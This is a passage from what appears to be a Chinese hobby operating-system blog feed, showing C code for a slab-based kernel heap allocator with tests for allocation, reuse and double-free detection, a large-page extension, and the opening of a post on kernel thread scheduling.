NUM_SLAB_CLASSES; i++) &#123;</span><br><span class="line">        slab_caches[i].object_size = SLAB_MIN_SIZE + i * SLAB_STEP;</span><br><span class="line">        slab_caches[i].partial = <span class="literal">NULL</span>;</span><br><span class="line">        slab_caches[i].full = <span class="literal">NULL</span>;</span><br><span class="line">        slab_caches[i].empty = <span class="literal">NULL</span>;</span><br><span class="line">        slab_caches[i].empty_count = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">slab_alloc</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">slab_page_t</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = slab_index(size);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= NUM_SLAB_CLASSES) &#123;</span><br><span class="line">        <span class="comment">// fallback：大块直接按页分配，先写个雏形，后续再完善</span></span><br><span class="line">        <span class="type">uint32_t</span> pages = (size + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE;</span><br><span class="line">        <span class="type">void</span> *ptr = (<span class="type">void</span> *)heap_next_free;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; pages; i++) alloc_heap_page();</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">slab_cache_t</span> *cache = &amp;slab_caches[idx];</span><br><span class="line">    <span class="type">size_t</span> objs_per_page = PAGE_SIZE / cache-&gt;object_size;      <span class="comment">// 一个页可以存多少个对象</span></span><br><span class="line">    <span class="type">size_t</span> obj_size = cache-&gt;object_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 优先从 partial 取</span></span><br><span class="line">    <span class="keyword">if</span> (cache-&gt;partial) &#123;</span><br><span class="line">        page = cache-&gt;partial;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 然后尝试复用 empty 页</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cache-&gt;empty) &#123;</span><br><span class="line">        page = cache-&gt;empty;</span><br><span class="line">        <span class="comment">// 从 empty 中移除</span></span><br><span class="line">        cache-&gt;empty = page-&gt;next;</span><br><span class="line">        page-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        cache-&gt;empty_count--;</span><br><span class="line">        <span class="comment">// 重置 freelist</span></span><br><span class="line">        init_freelist(page, cache-&gt;object_size);</span><br><span class="line">        page-&gt;used_count = <span class="number">0</span>;</span><br><span class="line">        add_to_list(&amp;cache-&gt;partial, page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 分配一个新的 slab 页</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        page = alloc_slab_page_meta();      <span class="comment">// 申请存slab page元数据结构体的空间</span></span><br><span class="line">        <span class="keyword">if</span> (!page) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">uint32_t</span> vaddr = alloc_heap_page();      <span class="comment">// 分配存obj的空间</span></span><br><span class="line">        <span class="keyword">if</span> (!vaddr) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        page-&gt;vaddr = vaddr;</span><br><span class="line">        page-&gt;used_count = <span class="number">0</span>;</span><br><span class="line">        page-&gt;owner_cache = cache;</span><br><span class="line">        <span class="built_in">memset</span>(page-&gt;bitmap, <span class="number">0</span>, <span class="keyword">sizeof</span>(page-&gt;bitmap));</span><br><span class="line">        init_freelist(page, cache-&gt;object_size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加进哈希表</span></span><br><span class="line">        <span class="type">size_t</span> index = slab_page_hash((<span class="type">uintptr_t</span>)vaddr);</span><br><span class="line">        page-&gt;next_hash = slab_page_map[index];</span><br><span class="line">        slab_page_map[index] = page;</span><br><span class="line"></span><br><span class="line">        add_to_list(&amp;cache-&gt;partial, page);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取一个obj出来分配</span></span><br><span class="line">    <span class="type">slab_object_t</span> *obj = page-&gt;freelist;</span><br><span class="line">    <span class="keyword">if</span> (!obj) <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 维护 bitmap</span></span><br><span class="line">    <span class="type">uint32_t</span> offset = (<span class="type">uint32_t</span>)obj - page-&gt;vaddr;</span><br><span class="line">    <span class="type">size_t</span> index = offset / obj_size;</span><br><span class="line">    <span class="type">uint8_t</span> bit_offset = index % <span class="number">8</span>;</span><br><span class="line">    page-&gt;bitmap[index/<span class="number">8</span>] |= (<span class="number">1</span> &lt;&lt; bit_offset);  <span class="comment">// 标记为已使用</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从 freelist 中取出</span></span><br><span class="line">    page-&gt;freelist = obj-&gt;next;</span><br><span class="line">    page-&gt;used_count++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空整个对象空间,清除旧指针</span></span><br><span class="line">    <span class="built_in">memset</span>(obj, <span class="number">0</span>, obj_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;used_count == objs_per_page) &#123;</span><br><span class="line">        <span class="comment">// 移动到 full list</span></span><br><span class="line">        remove_from_list(&amp;cache-&gt;partial, page);</span><br><span class="line">        add_to_list(&amp;cache-&gt;full, page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG)  kernel_printf(<span class="string">&quot;slab alloc: %x, size:%d\n&quot;</span>, obj, obj_size);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">slab_free</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!ptr) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> vaddr = (<span class="type">uint32_t</span>)ptr;</span><br><span class="line">    <span class="type">slab_page_t</span> *page = get_slab_page(vaddr);</span><br><span class="line">    <span class="keyword">if</span> (!page || !page-&gt;owner_cache) <span class="keyword">return</span>;   <span class="comment">// 非 slab 管理区</span></span><br><span class="line"></span><br><span class="line">    <span class="type">slab_cache_t</span> *cache = page-&gt;owner_cache;    <span class="comment">// 反查所属 slab cache</span></span><br><span class="line">    <span class="type">size_t</span> obj_size = cache-&gt;object_size;</span><br><span class="line">    <span class="type">size_t</span> objs_per_page = PAGE_SIZE / obj_size;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> offset = vaddr - page-&gt;vaddr;</span><br><span class="line">    <span class="keyword">if</span> (offset % obj_size != <span class="number">0</span> || offset &gt;= PAGE_SIZE) <span class="keyword">return</span>;  <span class="comment">// 非合法对象指针</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> index = offset / obj_size;</span><br><span class="line">    <span class="type">size_t</span> byte_index = index / <span class="number">8</span>;</span><br><span class="line">    <span class="type">size_t</span> bit_offset = index % <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// double free 检查：如果这个 bit 已经是 0，说明已经释放过了</span></span><br><span class="line">    <span class="keyword">if</span> (((page-&gt;bitmap[byte_index] &gt;&gt; bit_offset) &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        kernel_printf(<span class="string">&quot;double free detected!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;  <span class="comment">// double free</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 标记为未使用（bit 清零）</span></span><br><span class="line">    page-&gt;bitmap[byte_index] &amp;= ~(<span class="number">1</span> &lt;&lt; bit_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入回 freelist</span></span><br><span class="line">    ((<span class="type">slab_object_t</span> *)ptr)-&gt;next = page-&gt;freelist;</span><br><span class="line">    page-&gt;freelist = (<span class="type">slab_object_t</span> *)ptr;</span><br><span class="line"></span><br><span class="line">    page-&gt;used_count--;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 full → partial</span></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;used_count == objs_per_page - <span class="number">1</span>) &#123;</span><br><span class="line">        remove_from_list(&amp;cache-&gt;full, page);</span><br><span class="line">        add_to_list(&amp;cache-&gt;partial, page);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从 partial → empty</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (page-&gt;used_count == <span class="number">0</span>) &#123;</span><br><span class="line">        remove_from_list(&amp;cache-&gt;partial, page);</span><br><span class="line">        <span class="comment">// lazy shrink: 加入 empty 链表（不立刻释放）</span></span><br><span class="line">        add_to_list(&amp;cache-&gt;empty, page);</span><br><span class="line">        cache-&gt;empty_count++;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;empty_count &gt; MAX_EMPTY_PAGES) &#123;</span><br><span class="line">            shrink_slab_cache(cache);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shrink_slab_cache</span><span class="params">(<span class="type">slab_cache_t</span> *cache)</span> &#123;       </span><br><span class="line">    <span class="comment">// 释放 empty 链表</span></span><br><span class="line">    <span class="type">slab_page_t</span> *page = cache-&gt;empty;</span><br><span class="line">    <span class="keyword">while</span> (page) &#123;</span><br><span class="line">        <span class="comment">// 实际释放 slab page</span></span><br><span class="line">        free_heap_page((<span class="type">void</span> *)page);</span><br><span class="line">        page = page-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    cache-&gt;empty_count = <span class="number">0</span>;</span><br><span class="line">    cache-&gt;empty = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">slab_page_t</span> *<span class="title function_">get_slab_page</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123;</span><br><span class="line">    <span class="comment">// 从虚拟地址获取到所属的slab page</span></span><br><span class="line">    <span class="type">uintptr_t</span> page_base = (<span class="type">uintptr_t</span>)ptr &amp; ~(PAGE_SIZE - <span class="number">1</span>);        <span class="comment">// 去除最后12位</span></span><br><span class="line">    <span class="type">size_t</span> index = slab_page_hash(page_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">slab_page_t</span> *cur = slab_page_map[index];</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur-&gt;vaddr == page_base)</span><br><span class="line">            <span class="keyword">return</span> cur;</span><br><span class="line">        cur = cur-&gt;next_hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_freelist</span><span class="params">(<span class="type">slab_page_t</span> *page, <span class="type">size_t</span> obj_size)</span> &#123;            <span class="comment">// 初始化page内部管理的freelist</span></span><br><span class="line">    <span class="type">size_t</span> objs_per_page = PAGE_SIZE / obj_size;</span><br><span class="line">    page-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = objs_per_page - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="type">slab_object_t</span> *obj = (<span class="type">slab_object_t</span> *)(page-&gt;vaddr + i * obj_size);</span><br><span class="line">        obj-&gt;next = page-&gt;freelist;</span><br><span class="line">        page-&gt;freelist = obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dump_slab_cache_partial_freelist</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;            <span class="comment">// 查看slab caches的partial链表</span></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span> || size&gt;=NUM_SLAB_CLASSES*SLAB_STEP) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">slab_cache_t</span> *cache = &amp;slab_caches[(size<span class="number">-1</span>) / SLAB_STEP];</span><br><span class="line">    <span class="type">slab_page_t</span> *partial = cache-&gt;partial;</span><br><span class="line">    <span class="keyword">if</span> (!partial) <span class="keyword">return</span>;</span><br><span class="line">    kernel_printf(<span class="string">&quot;slab cache partial list for size %d:\n&quot;</span>, cache-&gt;object_size);</span><br><span class="line">    <span class="type">size_t</span> cnt1 = <span class="number">0</span>;       <span class="comment">// 记录已打印的freelist表项，限制最大显示长度</span></span><br><span class="line">    <span class="type">size_t</span> cnt2 = <span class="number">0</span>;       <span class="comment">// 记录已打印的partial表项，限制最大显示长度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">slab_page_t</span> *p = partial; p&amp;&amp;cnt2&lt;=<span class="number">5</span>; p = p-&gt;next,cnt2++)&#123;         <span class="comment">// 遍历partial链表</span></span><br><span class="line">        kernel_printf(<span class="string">&quot;partial-%d freelist:&quot;</span>,cnt2);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">slab_page_t</span> *page = p-&gt;freelist; page&amp;&amp;cnt1&lt;=<span class="number">5</span>; page = page-&gt;next,cnt1++) &#123;      <span class="comment">// 遍历freelist</span></span><br><span class="line">            kernel_printf(<span class="string">&quot; %x-&gt;&quot;</span>, page);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kernel_printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add_to_list</span><span class="params">(<span class="type">slab_page_t</span> **<span class="built_in">list</span>, <span class="type">slab_page_t</span> *page)</span> &#123;</span><br><span class="line">    page-&gt;next = *<span class="built_in">list</span>;</span><br><span class="line">    *<span class="built_in">list</span> = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_from_list</span><span class="params">(<span class="type">slab_page_t</span> **<span class="built_in">list</span>, <span class="type">slab_page_t</span> *page)</span> &#123;</span><br><span class="line">    <span class="type">slab_page_t</span> *prev = <span class="literal">NULL</span>, *cur = *<span class="built_in">list</span>;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == page) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prev) prev-&gt;next = cur-&gt;next;</span><br><span class="line">            <span class="keyword">else</span> *<span class="built_in">list</span> = cur-&gt;next;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        prev = cur;</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="简单测试结果">简单测试结果</h3>
<p>这里在<strong>kernel_main</strong>里写几个测试堆分配的函数，调用这些函数看看堆管理的基本行为是否符合预期。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test_basic_alloc_free</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *a = kmalloc(<span class="number">32</span>);</span><br><span class="line">    <span class="type">void</span> *b = kmalloc(<span class="number">32</span>);</span><br><span class="line">    <span class="type">void</span> *c = kmalloc(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    kernel_printf(<span class="string">&quot;Allocated a: %x, b: %x, c: %x\n&quot;</span>, a, b, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">&quot;hello A&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">&quot;hello B&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">&quot;hello C&quot;</span>);</span><br><span class="line"></span><br><span class="line">    kernel_printf(<span class="string">&quot;Data: %s %s %s\n&quot;</span>, (<span class="type">char</span> *)a, (<span class="type">char</span> *)b, (<span class="type">char</span> *)c);</span><br><span class="line"></span><br><span class="line">    kfree(a);</span><br><span class="line">    kfree(b);</span><br><span class="line">    dump_slab_cache_partial(<span class="number">32</span>);</span><br><span class="line">    kfree(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test_double_free</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *a = kmalloc(<span class="number">64</span>);</span><br><span class="line">    kfree(a);</span><br><span class="line">    kernel_printf(<span class="string">&quot;Freed a once\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    kfree(a);  <span class="comment">// 应该检测到 double free 并报警或忽略</span></span><br><span class="line">    kernel_printf(<span class="string">&quot;Tried to free a again (should trigger warning)\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test_multiple_sizes</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *s1 = kmalloc(<span class="number">32</span>);</span><br><span class="line">    <span class="type">void</span> *s2 = kmalloc(<span class="number">128</span>);</span><br><span class="line">    <span class="type">void</span> *s3 = kmalloc(<span class="number">256</span>);</span><br><span class="line">    kernel_printf(<span class="string">&quot;Allocated sizes 32 -&gt; %p, 128 -&gt; %p, 256 -&gt; %p\n&quot;</span>, s1, s2, s3);</span><br><span class="line"></span><br><span class="line">    kfree(s1);</span><br><span class="line">    kfree(s2);</span><br><span class="line">    kfree(s3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test_reuse</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *a1 = kmalloc(<span class="number">64</span>);</span><br><span class="line">    kfree(a1);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *a2 = kmalloc(<span class="number">64</span>);</span><br><span class="line">    kernel_printf(<span class="string">&quot;a1 = %p, a2 = %p (should be same if reused)\n&quot;</span>, a1, a2);</span><br><span class="line"></span><br><span class="line">    kfree(a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>test_basic_alloc_free</strong>结果如下，发现首先分配到的是连续的堆空间的地址，然后也可以写入而不触发缺页异常。在free之后我们可以发现后free的b会在partial的freelist的链表头部，符合我们设计的头插FILO的链表。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%AE%9E%E7%8E%B0/image-20250526220648528.png"
                      class=""
                >
<p><strong>test_multiple_sizes</strong>结果如下，因为一开始每个cache中都是空的，所以会映射一片新的页来存储。连续的分配新页符合预期。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%AE%9E%E7%8E%B0/image-20250526220809324.png"
                      class=""
                >
<p><strong>test_reuse</strong>也正常工作，相同大小的的chunk可以复用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%AE%9E%E7%8E%B0/image-20250526221014510.png"
                      class=""
                >
<p><strong>test_double_free</strong>也可以检测到重复释放，从而不进行任何操作返回。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%AE%9E%E7%8E%B0/image-20250526221537211.png"
                      class=""
                >
<p>现在可以进行简单的运用，虽然没有尝试大量分配内存后是否会存在bug，但目前简单实现还是比较成功的。后续还可以扩展超过1页内存的大页分配逻辑。</p>
<h3 id="大页分配逻辑扩展">大页分配逻辑扩展</h3>
<p>我们这里复用之前的slab_page来表示大页，其中用到一个新的字段pages。这里我们先简单实现一个大页分配器，主要是用一个链表来存所有已分配的大页，而释放时也先不加入缓存机制，可以直接归还物理内存并从分配链表中移除。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">slab_page</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_t</span> *<span class="title">next</span>;</span>             <span class="comment">// 指向下一个slab page</span></span><br><span class="line">    <span class="type">uint32_t</span> vaddr;                     <span class="comment">// 其obj页的虚拟地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_object_t</span> *<span class="title">freelist</span>;</span>            <span class="comment">// 指向空闲对象链表（对象内维护 next 指针）</span></span><br><span class="line">    <span class="type">uint32_t</span> used_count;                <span class="comment">// 已使用的对象数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_cache</span> *<span class="title">owner_cache</span>;</span>     <span class="comment">// slab page 所属的 slab cache</span></span><br><span class="line">    <span class="type">uint8_t</span>  bitmap[<span class="number">16</span>];               <span class="comment">// 最多支持 128 个对象（2048 / 16）,128/8=16</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_t</span> *<span class="title">next_hash</span>;</span>        <span class="comment">// hash table 中的下一个 slab page</span></span><br><span class="line">    <span class="type">uint32_t</span> pages;                <span class="comment">// 分配页数,大页分配使用;0:小页，x:大页</span></span><br><span class="line">&#125; <span class="type">slab_page_t</span>;</span><br></pre></td></tr></table></figure></div>
<p>这里相应可以复用<strong>alloc_slab_page_meta</strong>来申请存slab
page元数据结构体的空间，也可以填入hash
table中方便后续<strong>slab_free</strong>时可以用之前实现的<strong>get_slab_page</strong>得到对应的<strong>slab
page</strong>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">slab_page_t</span> *large_alloc_list = <span class="literal">NULL</span>;         <span class="comment">// 存大页的链表</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">slab_alloc</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="type">slab_page_t</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = slab_index(size);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= NUM_SLAB_CLASSES) &#123;</span><br><span class="line">        <span class="comment">// fallback：大块直接按页分配</span></span><br><span class="line">        <span class="type">uint32_t</span> pages = (size + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE;</span><br><span class="line">        kernel_printf(<span class="string">&quot;[slab] alloc %d bytes(%d pages), fallback to pmm_alloc_pages\n&quot;</span>, size, pages);</span><br><span class="line">        page = alloc_slab_page_meta();      <span class="comment">// 申请存slab page元数据结构体的空间</span></span><br><span class="line">        <span class="keyword">if</span> (!page) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        page-&gt;pages = pages;</span><br><span class="line">        <span class="type">void</span> *ptr = (<span class="type">void</span> *)heap_next_free;</span><br><span class="line">        page-&gt;vaddr = (<span class="type">uint32_t</span>)ptr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; pages; i++) alloc_heap_page();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加进哈希表</span></span><br><span class="line">        <span class="type">size_t</span> index = slab_page_hash((<span class="type">uintptr_t</span>)ptr);</span><br><span class="line">        page-&gt;next_hash = slab_page_map[index];</span><br><span class="line">        slab_page_map[index] = page;</span><br><span class="line"></span><br><span class="line">        add_to_list(&amp;large_alloc_list, page);</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_heap_pages</span><span class="params">(<span class="type">slab_page_t</span> *page,<span class="type">uint32_t</span> count)</span>&#123;     <span class="comment">// 释放多页，为大页准备</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;count;i++) &#123; </span><br><span class="line">        unmap_page(page-&gt;vaddr + i * PAGE_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    free_slab_page_meta(page);</span><br><span class="line">    remove_slab_page_from_hash(page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">slab_free</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!ptr) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">uint32_t</span> vaddr = (<span class="type">uint32_t</span>)ptr;</span><br><span class="line">    <span class="type">slab_page_t</span> *page = get_slab_page(vaddr);</span><br><span class="line">    <span class="keyword">if</span> (!page || !page-&gt;owner_cache) <span class="keyword">return</span>;   <span class="comment">// 非 slab 管理区</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;pages==<span class="number">0</span>)&#123;        <span class="comment">// 小页</span></span><br><span class="line">        ......</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;      <span class="comment">// 大页</span></span><br><span class="line">        remove_from_list(&amp;large_alloc_list, page);</span><br><span class="line">        free_heap_pages(page,page-&gt;pages);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始搭建自制操作系统——内核线程调度简单实现</title>
    <url>/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>在进行实现进程和线程的实现之前，我们先处理几个之前遗留下来的问题。</p>
<h4 id="分页后跳转处理">分页后跳转处理</h4>
<p>之前的实现中遗留了一个问题，就是我们开启分页后执行流还是在物理地址的恒等映射的前4MB上的，并没有切换到高虚拟地址处执行。这里我们先实现一下一开启分页就跳转到对应地址。这里我选择的是重新布局kernel.c，并将入口设置为<strong>kernel_init</strong>函数，从而一加载kernel就初始化堆管理并开启分页，之后我们<strong>vmm_init</strong>里就可以借助<strong>kernel_main</strong>函数的地址进行跳转了。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pmm_init(MEMORY_MAP_ADDR);      <span class="comment">// 初始化物理内存管理</span></span><br><span class="line">    vmm_init();                     <span class="comment">// 初始化虚拟内存管理，开启分页</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line">    idt_install();</span><br><span class="line">    irq_remap();</span><br><span class="line">    isr_install();</span><br><span class="line">    irq_install();</span><br><span class="line">    kheap_init();                   <span class="comment">// 初始化堆管理</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;    <span class="comment">// 开中断</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; </span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;  <span class="comment">// 节省CPU</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><strong>vmm.c</strong>的更改如下，主要加了一个跳转：</p>
